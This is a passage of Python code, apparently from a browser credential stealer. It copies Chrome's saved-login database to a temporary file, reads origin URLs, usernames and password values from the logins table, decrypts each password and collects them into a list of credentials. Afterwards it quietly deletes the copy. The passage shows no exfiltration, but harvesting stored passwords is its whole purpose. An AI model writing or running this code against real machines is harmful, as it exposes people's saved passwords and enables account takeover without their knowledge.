    -filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

    credentials = []
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            credentials.append({
                "Origin URL": origin_url,
                "Action URL": action_url,
                "Username": username,
                "Password": password
            })

    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

    return credentials-
